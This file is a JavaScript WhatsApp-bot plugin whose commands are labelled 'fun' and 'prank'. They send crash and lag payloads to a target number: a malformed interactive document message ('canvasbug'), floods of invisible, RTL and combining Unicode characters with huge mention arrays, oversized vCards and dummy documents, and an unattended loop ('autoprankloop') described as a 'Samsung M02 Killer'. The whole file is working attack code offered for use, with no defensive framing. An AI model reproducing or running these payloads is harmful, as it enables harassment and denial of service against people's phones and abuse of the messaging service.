const { cmd ,commands } = require('../command');
const { exec } = require('child_process');
const config = require('../config');
const {sleep} = require('../lib/functions')

cmd({
  pattern: "canvasbug",
  use: ".canvasbug <@user> or <number>",
  category: "fun",
  desc: "Canvas Bug Function by Didula Rashmika",
  filename: __filename
}, async (conn, m, mek, { args, reply }) => {
  if (!args[0]) return await reply("*Reply to a user or provide a number!* (ex: .canvasbug 9471xxxxxxx)");

  let target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  let uitext = "සෙට් එක දෙනවා. 🥵 " + "꧀".repeat(50000);

  try {
    await conn.relayMessage(target, {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: 'https://mmg.whatsapp.net/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0&mms3=true',
                mimetype: 'application/pdf',
                fileSha256: "NpR4V+tVc+N2p3zZgKO9Zzo/I7LrhNHlJxyDBxsYJLo=",
                fileLength: "999999999",
                pageCount: 0x9184e729fff,
                mediaKey: "6l+ksifBQsLHuJJGUs5klIE98Bv7usMDwGm4JF2rziw=",
                fileName: "unidentifiedMessageType",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                directPath: '/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0',
                mediaKeyTimestamp: "1715880173",
                contactVcard: true
              },
              title: "",
              hasMediaAttachment: true
            },
            body: {
              text: uitext
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
              groupMentions: [{ groupJid: "1@newsletter", groupSubject: "tske" }]
            }
          }
        }
      }
    }, { participant: { jid: target } }, { messageId: null });

    await reply("✅ Canvas Bug sent to: " + target);
  } catch (e) {
    console.error(e);
    await reply("❌ Failed to send bug message.");
  }
});



cmd({
  pattern: "bug2",
  use: ".ultraprank <@user> or <number>",
  category: "fun",
  desc: "Extreme WhatsApp Lag Prank (use with caution)",
  filename: __filename
}, async (conn, m, mek, { args, reply }) => {
  if (!args[0]) return await reply("*Reply to a user or provide a number!* (ex: .ultraprank 9471xxxxxxx)");

  let target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Ultra lag payload — mix of RTL chars, invisible chars, and huge mention arrays
  let glitchText = "꧀".repeat(1000) + "\u2063".repeat(200000) + "꧀".repeat(1000);

  let contextSpam = {
    mentionedJid: Array.from({ length: 50 }, () => "1@newsletter"),
    forwardingScore: 9999,
    isForwarded: true,
    externalAdReply: {
      title: "CRASH MODE",
      body: "tap if you dare",
      mediaType: 1,
      thumbnail: Buffer.alloc(0), // blank buffer to confuse preview
      renderLargerThumbnail: true,
      showAdAttribution: true,
      sourceUrl: "https://whatsapp.com/channel/0029VagCogPGufJ3kZWjsW3A" // fake
    }
  };

  try {
    // Send 3 heavy glitch messages
    for (let i = 0; i < 3; i++) {
      await conn.sendMessage(target, {
        text: glitchText,
        contextInfo: contextSpam
      });
      await sleep(1000);
    }

    await reply("✅ Ultra Lag Prank sent to " + target);
  } catch (e) {
    console.error(e);
    await reply("❌ Failed to send.");
  }
});



 // Global variable for loop tracking
let activePrankLoops = {};

cmd({
  pattern: "autoprankloop",
  use: ".autoprankloop <@user|number> <intervalSec>",
  category: "fun",
  desc: "Start non-stop lag attack (Samsung M02 Killer)",
  filename: __filename
}, async (conn, m, mek, { args, reply, sleep }) => {
  if (args.length < 2) return reply("Usage: .autoprankloop <number> <intervalSec>");

  const target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const interval = parseInt(args[1]) * 1000;

  if (activePrankLoops[target]) return reply("❗Already running for this user.");

  reply("✅ Starting auto lag attack every " + args[1] + " seconds on: " + target);

  activePrankLoops[target] = setInterval(async () => {
    const rtl = "\u202E", zwsp = "\u200B", invisible = "\u2063";
    const killerText = rtl.repeat(500) + zwsp.repeat(10000) + invisible.repeat(300000) + "꧀".repeat(3000);

    const contextSpam = {
      mentionedJid: Array.from({ length: 250 }, () => "0@s.whatsapp.net"),
      forwardingScore: 9999,
      isForwarded: true,
      externalAdReply: {
        title: "BOOM!",
        body: "Auto Crash Sequence",
        mediaType: 1,
        thumbnail: Buffer.from([0xff, 0xd8, 0xff, 0xe1]), // fake JPG
        renderLargerThumbnail: true,
        showAdAttribution: true,
        sourceUrl: "https://example.com/prank"
      }
    };

    // 1. Glitch Message
    await conn.sendMessage(target, {
      text: killerText,
      contextInfo: contextSpam
    });

    // 2. Corrupted VCard
    await conn.sendMessage(target, {
      contacts: {
        displayName: "Loop Crash",
        contacts: [{
          vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:" + "OVERLOAD_".repeat(5000) + "\nEND:VCARD"
        }]
      }
    });

    // 3. 5MB fake doc
    await conn.sendMessage(target, {
      document: Buffer.alloc(1024 * 1024 * 5),
      mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
      fileName: "Crash_M02.docx",
      caption: zwsp.repeat(1000),
      contextInfo: contextSpam
    });
  }, interval);
});

cmd({
  pattern: "stopprank",
  use: ".stopprank <@user|number>",
  category: "fun",
  desc: "Stop prank loop for a specific user",
  filename: __filename
}, async (conn, m, mek, { args, reply }) => {
  if (!args[0]) return reply("Usage: .stopprank <number>");

  const target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  if (!activePrankLoops[target]) return reply("❗No loop running for this user.");

  clearInterval(activePrankLoops[target]);
  delete activePrankLoops[target];

  reply("✅ Prank loop stopped for " + target);
});

cmd({
  pattern: "autoprankstatus",
  use: ".autoprankstatus",
  category: "fun",
  desc: "Check which numbers are being pranked now",
  filename: __filename
}, async (conn, m, mek, { reply }) => {
  const targets = Object.keys(activePrankLoops);
  if (targets.length === 0) return reply("❌ No prank loops running.");

  const list = targets.map(t => `- ${t.replace(/@s\.whatsapp\.net/, "")}`).join("\n");
  reply("🔥 Active Auto Pranks:\n" + list);
}); 



cmd({
  pattern: "bug1",
  use: ".ultraprankx <@user> or <number>",
  category: "fun",
  desc: "EXTREME Lag Prank — may freeze low-end phones!",
  filename: __filename
}, async (conn, m, mek, { args, reply, sleep }) => {
  if (!args[0]) return await reply("*Reply to a user or provide a number!* (ex: .ultraprankx 9477xxxxxxx)");

  let target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // MASSIVE GLITCH TEXT + INVISIBLE LAG
  const glitch = "\u202E".repeat(500) + "\u2063".repeat(200000) + "꧀".repeat(1000);
  const overkillText = glitch + "\n\n".repeat(1000) + "CRASH".repeat(5000);

  const contextSpam = {
    mentionedJid: Array.from({ length: 200 }, () => "0@s.whatsapp.net"),
    forwardingScore: 9999,
    isForwarded: true,
    externalAdReply: {
      title: "Phone Destroyer",
      body: "Clicking may freeze your device.",
      mediaType: 1,
      thumbnail: Buffer.from([255, 216, 255, 224]), // fake corrupted JPG
      renderLargerThumbnail: true,
      showAdAttribution: true,
      sourceUrl: "https://whatsapp.com/channel/XXXX"
    }
  };

  try {
    // 1. SPAM glitch messages
    for (let i = 0; i < 10; i++) {
      await conn.sendMessage(target, {
        text: overkillText,
        contextInfo: contextSpam
      });
      await sleep(1200);
    }

    // 2. Fake Document Flood (acts heavy)
    await conn.sendMessage(target, {
      document: Buffer.alloc(1024 * 1024 * 2), // 2MB dummy file
      mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
      fileName: "CRASH_NOW.docx",
      caption: glitch,
      contextInfo: contextSpam
    });

    // 3. VCard Spam
    for (let i = 0; i < 3; i++) {
      await conn.sendMessage(target, {
        contacts: {
          displayName: "Lag Bomb",
          contacts: [{
            vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:" + "BOOM".repeat(5000) + "\nEND:VCARD"
          }]
        }
      });
      await sleep(1000);
    }

    await reply("✅ Super Lag Bomb Sent to " + target);
  } catch (e) {
    console.error(e);
    await reply("❌ Prank failed.");
  }
});

    
